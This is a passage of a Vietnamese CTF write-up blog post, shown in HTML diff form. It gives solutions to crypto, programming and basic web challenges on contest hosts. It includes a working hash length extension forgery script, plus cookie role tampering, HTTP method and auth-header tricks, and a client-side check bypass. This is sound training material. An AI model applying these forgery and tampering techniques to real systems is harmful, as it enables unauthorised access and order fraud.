+    <span class="k">elif</span> <span class="nb">len</span><span class="p">(</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">3</span><span class="p">:</span>
+        <span class="n">host</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nb">int</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
+
+    <span class="n">sys</span><span class="p">.</span><span class="n">stderr</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">'Listening {}:{}</span><span class="se">\n</span><span class="s">'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
+    <span class="n">server</span> <span class="o">=</span> <span class="n">ThreadedTCPServer</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">),</span> <span class="n">RequestHandler</span><span class="p">)</span>
+    <span class="n">server</span><span class="p">.</span><span class="n">daemon_threads</span> <span class="o">=</span> <span class="bp">True</span>
+    <span class="n">server</span><span class="p">.</span><span class="n">allow_reuse_address</span> <span class="o">=</span> <span class="bp">True</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">server</span><span class="p">.</span><span class="n">serve_forever</span><span class="p">()</span>
+    <span class="k">except</span> <span class="nb">KeyboardInterrupt</span><span class="p">:</span>
+        <span class="k">pass</span>
+    <span class="n">server</span><span class="p">.</span><span class="n">server_close</span><span class="p">()</span>
+
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Oce cái file này khiến tôi đau đầu, nhưng sau khi ngồi tự kỉ trong 10p thì mình đã chú ý đến hàm order:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payment</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'product=%s&amp;price=%d&amp;time=%.02f'</span> <span class="o">%</span> <span class="p">(</span>
+            <span class="n">items</span><span class="p">[</span><span class="n">pid</span><span class="o">-</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">],</span> <span class="n">items</span><span class="p">[</span><span class="n">pid</span><span class="o">-</span><span class="mi">1</span><span class="p">][</span><span class="mi">1</span><span class="p">],</span> <span class="n">datetime</span><span class="p">.</span><span class="n">datetime</span><span class="p">.</span><span class="n">now</span><span class="p">().</span><span class="n">timestamp</span><span class="p">())</span>
+        <span class="n">signature</span> <span class="o">=</span> <span class="n">sha512</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">signkey</span><span class="o">+</span><span class="n">payment</span><span class="p">).</span><span class="n">hexdigest</span><span class="p">()</span>
+        <span class="n">payment</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'&amp;sign=%s'</span> <span class="o">%</span> <span class="n">signature</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s">'Your order: '</span><span class="p">)</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">b64encode</span><span class="p">(</span><span class="n">payment</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>Nhìn thấy sha512 thì mình cũng hơi ngờ ngờ đây là <code class="language-plaintext highlighter-rouge">hash length extension attack</code>.</p>
+
+<p>Signkey được chèn vào sẽ có độ dài random từ 8 đến 32, không biết cụ thể là gì nên lại brute, brute đến chết :Đ</p>
+
+<p>Hàm parse_qsl dùng để tách các thành phần ra, mình sẽ thêm chuỗi “product=FLAG” sau khi chọn mua món hàng đầu tiên. Mà món hàng đầu tiên luôn là giá 1đ. Thì sau khi mình truyền chuỗi sau khi thêm “product=FLAG”, hàm parse_qsl sẽ thực thi và món hàng mình mua sẽ là FLAG, chứ không phải là món hàng đầu tiên nữa. Cái này cũng hơi ná ná giống attack vào AES EBC mode nhỉ hê hê =))</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64encode</span><span class="p">,</span> <span class="n">b64decode</span>
+<span class="kn">from</span> <span class="nn">hashpumpy</span> <span class="kn">import</span> <span class="n">hashpump</span>
+
+<span class="k">def</span> <span class="nf">parse_qsl</span><span class="p">(</span><span class="n">query</span><span class="p">):</span>
+    <span class="n">m</span> <span class="o">=</span> <span class="p">{}</span>
+    <span class="n">parts</span> <span class="o">=</span> <span class="n">query</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">'&amp;'</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">part</span> <span class="ow">in</span> <span class="n">parts</span><span class="p">:</span>
+        <span class="n">key</span><span class="p">,</span> <span class="n">val</span> <span class="o">=</span> <span class="n">part</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">'='</span><span class="p">)</span>
+        <span class="n">m</span><span class="p">[</span><span class="n">key</span><span class="p">]</span> <span class="o">=</span> <span class="n">val</span>
+    <span class="k">return</span> <span class="n">m</span>
+
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'chal1.crypto.letspentest.org'</span><span class="p">,</span> <span class="mi">7000</span><span class="p">)</span>
+
+    <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'2'</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'1'</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'Your order: '</span><span class="p">)</span>
+    <span class="n">payment</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+
+    <span class="n">payment</span> <span class="o">=</span> <span class="n">b64decode</span><span class="p">(</span><span class="n">payment</span><span class="p">)</span>
+    <span class="n">signature</span> <span class="o">=</span> <span class="n">parse_qsl</span><span class="p">(</span><span class="n">payment</span><span class="p">)</span>
+    <span class="n">signature</span> <span class="o">=</span> <span class="n">signature</span><span class="p">[</span><span class="sa">b</span><span class="s">'sign'</span><span class="p">]</span>
+
+    <span class="n">payment</span> <span class="o">=</span> <span class="n">payment</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">'&amp;'</span><span class="p">)</span>
+    <span class="k">del</span> <span class="n">payment</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
+    <span class="n">payment</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'&amp;'</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">payment</span><span class="p">)</span>
+
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="mi">33</span><span class="p">):</span>
+        <span class="n">new_signature</span><span class="p">,</span> <span class="n">new_data</span> <span class="o">=</span> <span class="n">hashpump</span><span class="p">(</span><span class="n">signature</span><span class="p">,</span> <span class="n">payment</span><span class="p">,</span> <span class="s">'&amp;product=FLAG'</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
+        
+        <span class="n">payload</span> <span class="o">=</span> <span class="n">new_data</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'&amp;sign='</span> <span class="o">+</span> <span class="n">new_signature</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="n">b64encode</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+        
+        <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">'3'</span><span class="p">)</span>
+        <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+        <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+        <span class="k">if</span> <span class="sa">b</span><span class="s">'Invalid order'</span> <span class="ow">in</span> <span class="n">result</span><span class="p">:</span>
+            <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+            <span class="k">continue</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">())</span>
+            <span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Sau một hồi chạy thì ta nhận được flag, nhưng không biết do server lỗi hay cố tình mà flag format lại là FLag chứ không phải là Flag, đề nghị Mèo Yang Hồ, Hazy kiểm điểm và tự kiểm điểm =))</p>
+
+<p>Flag: <code class="language-plaintext highlighter-rouge">Flag{hashlengthextensionattack}</code></p>
+
+<h1 id="programming">PROGRAMMING</h1>
+
+<h2 id="sum">SUM()</h2>
+<blockquote>
+  <p>Bỏ qua tất cả các tích phân, đạo hàm, ma trận, sác xuất. Gà hãy kết nối tới máy chủ của Cookie Arena và thực hiện tính tổng của dãy số đã cho một cách nhanh nhất.</p>
+
+  <p>Hãy học cách sử dụng Python và player.py để giải toán nha</p>
+
+  <p>programming.letspentest.org 8111</p>
+</blockquote>
+
+<p>Đây chỉ là bài tính tổng các số cơ bản, chỉ cần thêm đoạn script python để xử lý dữ liệu nhận được, typecast là xong.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">solver</span><span class="p">(</span><span class="n">received</span><span class="p">):</span>
+    <span class="n">list_line</span> <span class="o">=</span> <span class="n">received</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">list_line</span><span class="p">:</span>
+        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">line</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">line</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">isdigit</span><span class="p">():</span>
+                <span class="k">return</span> <span class="nb">sum</span><span class="p">([</span><span class="nb">int</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">line</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">' '</span><span class="p">)</span> <span class="k">if</span> <span class="n">c</span><span class="p">.</span><span class="n">isdigit</span><span class="p">()])</span>
+</code></pre></div></div>
+<p>Flag: <code class="language-plaintext highlighter-rouge">Flag{1plust1_1s_2_qu1ck_mafth}</code></p>
+
+<h2 id="pro102">Pro102</h2>
+<blockquote>
+  <p>Rồi một ngày kia mắt anh tròn xoe như đường tròn lượng giác Khi bất ngờ một bài toán bậc 2 Cứ lầm tưởng rằng nghiệm duy nhất với ai Thật kinh hoàng phương trình vô nghiệm</p>
+
+  <p>(st)</p>
+
+  <p>programming.letspentest.org 8222</p>
+</blockquote>
+
+<p>À thì… đây là bài giải phương trình bậc 2, vẫn là code cơ bản thôi, cũng không có gì khó cả, đây là script giải, thú thật thì mấy bài programming dễ quá khiến mình hơi tụt mood .__.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">solver</span><span class="p">(</span><span class="n">received</span><span class="p">):</span>
+    <span class="n">list_line</span> <span class="o">=</span> <span class="n">received</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">list_line</span><span class="p">:</span>
+        <span class="k">if</span> <span class="s">"X^2"</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span>
+            <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">' '</span><span class="p">,</span> <span class="s">''</span><span class="p">)</span>
+            <span class="n">num</span> <span class="o">=</span> <span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="s">'[\+-]*\d+'</span><span class="p">,</span> <span class="n">line</span><span class="p">)]</span>
+            <span class="n">num</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">num</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">-</span> <span class="n">num</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span>
+            <span class="n">delta</span> <span class="o">=</span> <span class="n">num</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">*</span> <span class="n">num</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">num</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="n">num</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
+            <span class="n">ans</span> <span class="o">=</span> <span class="s">"NOPE"</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">delta</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">):</span>
+                <span class="n">ans</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="nb">int</span><span class="p">((</span><span class="o">-</span> <span class="n">num</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">-</span> <span class="n">math</span><span class="p">.</span><span class="n">sqrt</span><span class="p">(</span><span class="n">delta</span><span class="p">))</span> <span class="o">/</span> <span class="p">(</span><span class="mi">2</span> <span class="o">*</span> <span class="n">num</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span><span class="si">}</span><span class="s">, </span><span class="si">{</span><span class="nb">int</span><span class="p">((</span><span class="o">-</span> <span class="n">num</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="n">math</span><span class="p">.</span><span class="n">sqrt</span><span class="p">(</span><span class="n">delta</span><span class="p">))</span> <span class="o">/</span> <span class="p">(</span><span class="mi">2</span> <span class="o">*</span> <span class="n">num</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span><span class="si">}</span><span class="s">"</span>
+            <span class="k">return</span> <span class="n">ans</span>
+</code></pre></div></div>
+
+<p>Flag: <code class="language-plaintext highlighter-rouge">Flag{2fast2fur10us}</code></p>
+
+<h2 id="roberval">Roberval</h2>
+<blockquote>
+  <p>Hazy ngồi cân những viên bi mình đang có, loay hoay vẫn không biết phải cân bao nhiêu lần để tìm được viên bi nhẹ nhất.</p>
+
+  <p>Bạn giúp Hazy một tay với nhé.</p>
+
+  <p>programming.letspentest.org 8333</p>
+</blockquote>
+
+<p>Đây thực ra là marble problem mà mấy bạn học sinh lâu lâu vẫn hay lấy đố vui nhau kiểu “Có N bi nhìn y như nhau trong đó có 1 viên khác cân nặng, hỏi số lần cân ít nhất để tìm ra hòn bi nhẹ/nặng hơn.” Cũng khá buồn cười vì ngay ngày hôm trước khi thi giải cookie thì một người bạn của mình đã có bạn đố vui về vấn đề này, mình đi dạo trên mạng một tí và cũng đã tìm ra được công thức tổng quát cho vấn đề này.</p>
+
+<p>Công thức tổng quát: $\log_3(N)$ rồi làm tròn lên</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">solver</span><span class="p">(</span><span class="n">received</span><span class="p">):</span>
+    <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">math</span><span class="p">.</span><span class="n">ceil</span><span class="p">(</span><span class="n">math</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="s">'\d+'</span><span class="p">,</span> <span class="n">received</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">]),</span> <span class="mi">3</span><span class="p">)))</span>
+</code></pre></div></div>
+
+<p>Flag: <code class="language-plaintext highlighter-rouge">Flag{n0_pr0b_w1th_cub3_r00t_RIGHT?}</code></p>
+
+<h1 id="web-basic">WEB BASIC</h1>
+
+<h2 id="hân-hoan">Hân hoan</h2>
+<blockquote>
+  <p>Thấy hộp bánh quy của chú Hazy để hớ hênh trên bàn. Với bản tính nghịch ngợm, Mèo Yang Hồ nhanh tay thêm chút gia vị để biến cuộc đời trở nên hài hước và hân hoan hơn.</p>
+
+  <p>http://chal5.web.letspentest.org/</p>
+</blockquote>
+
+<p>Đọc qua đề bài thì mình thấy từ <code class="language-plaintext highlighter-rouge">bánh quy</code> nên nghĩ ngay tới <code class="language-plaintext highlighter-rouge">cookie</code>. Khi bấm vào link challenge thì thấy có một form đăng nhập.</p>
+
+<p>Mình thử đăng nhập bằng <code class="language-plaintext highlighter-rouge">username=un</code> và <code class="language-plaintext highlighter-rouge">passoword=pw</code> (giá trị bất kì) thì thấy xuất hiện như sau:</p>
+
+<p><img src="https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/han_hoan_1.png" alt="" /></p>
+
+<p>Bây giờ thì lại auto F12 đến tab cookie thôi nào.</p>
+
+<p>Mặc định thì ta sẽ thấy Role có giá trị mặc định là Guest, hmmmm, trang web bảo “You’re not CookieHanHoan!” nên có thể ta sẽ đổi giá trị Role thành “CookieHanHoan” chăng?</p>
+
+<p>Oce thử đổi và refresh trang web thì có luôn flag.</p>
+
+<p>Flag: <code class="language-plaintext highlighter-rouge">Flag{Cookies_Yummy_Cookies_Yammy!}</code></p>
+
+<h2 id="header-401">Header 401</h2>
+<blockquote>
+  <p>Để nhiều loại Trình duyệt và Web Server có thể nói chuyện và hiểu được nhau thì họ phải sử dụng chung một giao thức có tên gọi là HTTP Protocol. Khi người dùng bắt đầu truy cập Web, trình duyệt sẽ chuyển những hành động của họ thành yêu cầu (Request) tới Web Server. Còn Web Server sẽ trả lời (Response) xem có thể đáp ứng hay từ chối cung cấp thông tin cho trình duyệt.</p>
+
+  <p>Ví dụ, bạn Gà muốn LẤY danh sách các thử thách trong cookiearena<chấm>org, ở đường dẫn /challenges bằng TRÌNH DUYỆT Chrome. Trình duyệt của Gà sẽ phải điền vào một cái form mẫu có tên gọi là HTTP Header và gửi đi. Mỗi yêu cầu sẽ được viết trên một dòng, và nội dung của mỗi yêu cầu sẽ phải viết đằng sau dấu hai chấm.</chấm></p>
+
+  <p>Hãy đoán xem trong thử thách này có những Header thú vị nào nha</p>
+
+  <p>http://chal3.web.letspentest.org/</p>
+</blockquote>
+
+<p>Đọc đề bài mình chú ý các từ khoá như <code class="language-plaintext highlighter-rouge">HTTP Header</code>, <code class="language-plaintext highlighter-rouge">HTTP Request</code>, <code class="language-plaintext highlighter-rouge">HTTP Response</code>, từ <code class="language-plaintext highlighter-rouge">LẤY</code> được viết in hoa nhằm ám chỉ <code class="language-plaintext highlighter-rouge">GET</code> method. Tới đây mình dự đoán sẽ thử thay đổi method, HTTP Header, gửi request và quan sát response.</p>
+
+<p><img src="https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/Header_401_1.png" alt="" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">Hello GET Request</code>, ám chỉ mình thử đổi thành method khác. Bật Burp Suite và thử nào.</p>
+
+<p><img src="https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/Header_401_2.png" alt="" /></p>
+
+<p>Hella sú ngl. Cứ note lại đã <code class="language-plaintext highlighter-rouge">Basic Authentication Credential: gaconlonton/cookiehanhoan</code></p>
+
+<p><img src="https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/Header_401_3.png" alt="" /></p>
+
+<p>Chuyển sang tab Repeater, chuyển method từ GET thành POST, bấm send thì server báo <code class="language-plaintext highlighter-rouge">Missing Basic Authorization Header.</code>.</p>
+
+<p><img src="https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/Header_401_4.png" alt="" /></p>
+
+<p>Chúng ta dùng thông tin <code class="language-plaintext highlighter-rouge">Basic Authentication Credential: gaconlonton/cookiehanhoan</code> để thêm header <code class="language-plaintext highlighter-rouge">Authorization: Basic Z2Fjb25sb250b246Y29va2llaGFuaG9hbg==</code>. Bấm send và nhận flag, ez win ehh.</p>
+
+<p><img src="https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/Header_401_5.png" alt="" /></p>
+
+<p>Flag: <code class="language-plaintext highlighter-rouge">Flag{m4g1c@l_h34d3r_xD}</code></p>
+
+<h2 id="i-am-not-a-robot">I am not a robot</h2>
+<blockquote>
+  <p>Nếu là người thì cho xem tai, còn nếu là robot thì đứng ở ngoài. Bạn đã bị chặn.</p>
+
+  <p>http://chal2.web.letspentest.org/</p>
+</blockquote>
+
+<p>Đề bài quá quen thuộc rồi nhỉ? Ta vào xem <code class="language-plaintext highlighter-rouge">robots.txt</code> luôn.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://chal2.web.letspentest.org/robots.txt
+-----------------------------------------------------
+User-agent: Googlebot
+Disallow: /nogooglebot/
+
+User-agent: *
+Allow: /fl@g1337_d240c789f29416e11a3084a7b50fade5.txt
+
+Sitemap: http://www.example.com/sitemap.xml
+</code></pre></div></div>
+
+<p>Tại đây ta thấy path <code class="language-plaintext highlighter-rouge">/fl@g1337_d240c789f29416e11a3084a7b50fade5.txt</code> rất đáng nghi nên ta vào xem luôn.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://chal2.web.letspentest.org/fl@g1337_d240c789f29416e11a3084a7b50fade5.txt
+-----------------------------------------------------
+Flag{N0_B0T_@ll0w}
+</code></pre></div></div>
+
+<p>Flag: <code class="language-plaintext highlighter-rouge">Flag{N0_B0T_@ll0w}</code></p>
+
+<h2 id="impossible">Impossible</h2>
+<blockquote>
+  <p>Học lỏm được công thức chế tạo lá chắn tàng hình của Hazy. Gà nhanh chóng đem về xây dựng hệ thống phòng thủ của riêng mình. Liệu nó có làm khó được Mèo Yang Hồ không?</p>
+
+  <p>http://chal7.web.letspentest.org/</p>
+</blockquote>
+
+<p>Trang web cho ta một khung nhập mật khẩu, ngay khi inspect thì ta thấy luôn source code xử lý dữ liệu mà ta nhập vào.</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+<span class="kd">function</span> <span class="nx">checkPass</span><span class="p">()</span>
+<span class="p">{</span>
+	<span class="kd">var</span> <span class="nx">password</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">password</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
+	<span class="k">if</span> <span class="p">(</span><span class="nx">btoa</span><span class="p">(</span><span class="nx">password</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="dl">"</span><span class="s2">cookiehanhoan</span><span class="dl">"</span><span class="p">,</span> <span class="dl">""</span><span class="p">))</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">Y29va2llaGFuaG9hbg==</span><span class="dl">"</span><span class="p">)</span> <span class="p">{</span>
+		<span class="nb">window</span><span class="p">.</span><span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+			<span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">assign</span><span class="p">(</span><span class="dl">'</span><span class="s1">check.php?password=</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">password</span><span class="p">);</span>
+		<span class="p">},</span> <span class="mi">500</span><span class="p">);</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+<span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
+</span></code></pre></div></div>
+
+<p>Ở đây hàm <code class="language-plaintext highlighter-rouge">btoa</code> có tác dụng chuyển sang base64, ngược lại với <code class="language-plaintext highlighter-rouge">btoa</code> là <code class="language-plaintext highlighter-rouge">atob</code>. Ta biến đổi biểu thức:</p>
+
+<p><code class="language-plaintext highlighter-rouge">btoa(password.replace("cookiehanhoan", "")) == "Y29va2llaGFuaG9hbg=="</code></p>
+
+<p>=&gt; <code class="language-plaintext highlighter-rouge">atob(btoa(password.replace("cookiehanhoan", ""))) == atob("Y29va2llaGFuaG9hbg==")</code></p>
+
+<p>=&gt; <code class="language-plaintext highlighter-rouge">password.replace("cookiehanhoan", "") == "cookiehanhoan"</code>. (<code class="language-plaintext highlighter-rouge">atob("Y29va2llaGFuaG9hbg==")</code> chính là <code class="language-plaintext highlighter-rouge">"cookiehanhoan"</code>)</p>
+
+<p>Tức là mật khẩu của chúng ta sau khi bỏ <code class="language-plaintext highlighter-rouge">"cookiehanhoan"</code> phải là <code class="language-plaintext highlighter-rouge">"cookiehanhoan"</code>???</p>
+
+<p><img src="https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/Impossible_1.png" alt="" /></p>
+
+<p>Heh, không sao, chúng ta vẫn có cách: c<strong>cookiehanhoan</strong>ookiehanhoan. Phần im đậm sẽ được lược bỏ và ta nhận được <code class="language-plaintext highlighter-rouge">"cookiehanhoan"</code></p>
+
+<p>Submit và nhập flag nào hehe.</p>
+
+<p>Flag: <code class="language-plaintext highlighter-rouge">Flag{Javascript_is_not_safe???}</code></p>
+
+<h2 id="infinity-loop">Infinity Loop</h2>
+<blockquote>
+  <p>Cuộc đời luôn là vậy. Một giây trước tưởng đã cùng đường, một giây sau có lại đầy hy vọng. Các chiến binh đã có công cụ mạnh mẽ trong tay, hãy dùng nó để can thiệp dòng chảy.</p>
+
+  <p>http://chal6.web.letspentest.org/</p>
+</blockquote>
+
+<p>Đọc đề thì mình nghĩ ngay tới Burp Suite.</p>
+
+<p>Trang web lại cho ta một form để nhập password và username, quá nhiều form đăng nhập cho cuộc sống :(</p>
+
+<p>Mình nhập thử <code class="language-plaintext highlighter-rouge">username = ok</code>, <code class="language-plaintext highlighter-rouge">password = ok</code> rồi enter thì nó hiện trang web lỗi</p>
+
+<p><img src="https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/Infinity_Loop_1.png" alt="" /></p>
+
+<p>Thậm chí, mỗi lần refresh thì lại xuất hiện <code class="language-plaintext highlighter-rouge">id</code> khác, nên mình quyết định bật Burp Suite lên xem thử.</p>
+
+<p><img src="https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/Infinity_Loop_2.png" alt="" /></p>
+
+<p>Hm… Có vẻ như nó redirect liên tục rồi dừng.</p>
+
+<p><img src="https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/Infinity_Loop_3.png" alt="" /></p>
+
+<p>Redirect nhiều lần thật đấy nhưng sao không có <code class="language-plaintext highlighter-rouge">id = 6</code> =)) Chuyển sang Repeater rồi sửa <code class="language-plaintext highlighter-rouge">id = 6</code> là tìm thấy flag rồi.</p>
+
+<p><img src="https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/Infinity_Loop_4.png" alt="" /></p>
+
+<p><img src="https://raw.githubusercontent.com/th3-5had0w/th3-5had0w.github.io/master/public/resources/Infinity_Loop_5.png" alt="" /></p>
+
+<p>Flag: <code class="language-plaintext highlighter-rouge">Flag{Y0u_c4ptur3_m3_xD!!!}</code></p>
+
+<h2 id="js-bp-bp">JS B**p B**p</h2>
+<blockquote>
+  <p>Sau nhiều đêm suy nghĩ về việc làm thế nào để bảo vệ mã nguồn. Cố gắng thoát khỏi ánh mắt soi mói của Mèo Yang Hồ.</p>
+
+  <p>Gà chẹp miệng rồi nói: “Đã tới lúc phải cho nó phải thốt lên rằng! WTF!!!”</p>
+
+  <p>http://chal4.web.letspentest.org/</p>
+</blockquote>
+
+<p>Trang web cho 3 mục nhập User, Pass và Role, quen quá nhỉ, thôi lại F12 thôi =))</p>
+
+<p>Sau khi đọc source code thì mình thấy hàm <code class="language-plaintext highlighter-rouge">verifyUsername</code>, <code class="language-plaintext highlighter-rouge">verifyPassword</code> và <code class="language-plaintext highlighter-rouge">verifyRole</code> cần return true và khá chắc 3 hàm này ở trong 4 file js (1.js, 2.js, 3.js, 4.js) trong web.</p>
+
+<p>Bấm vô thì lòi ra cá đống JSF*ck @@</p>
+
+<p>Mình sẽ dùng tool <a href="https://enkhee-osiris.github.io/Decoder-JSFuck/">này</a> để decode JSF*ck. Tick chọn ô eval rồi dán vào rồi bấm decode là ra thôi 🤡</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// 1.js</span>
